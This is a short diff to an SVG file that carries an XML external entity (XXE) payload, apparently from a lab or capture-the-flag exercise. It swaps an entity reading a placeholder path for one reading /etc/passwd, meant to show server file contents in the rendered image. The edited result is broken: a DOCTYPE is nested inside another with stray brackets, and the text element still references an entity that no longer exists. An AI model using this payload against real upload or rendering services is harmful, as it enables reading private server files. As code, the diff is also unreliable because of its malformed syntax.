@@ -1,6 +1,5 @@
 <!DOCTYPE svg [
-    <!ENTITY file_content SYSTEM "file:///path/to/the/file/you/found">
-]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>]>
 <svg width="800" height="600" xmlns="http://www.w3.org/2000/svg">
   <style>
     text {
@@ -11,3 +10,4 @@
   </style>
   <text x="10" y="20" xml:space="preserve">&file_content;</text>
 </svg>
+
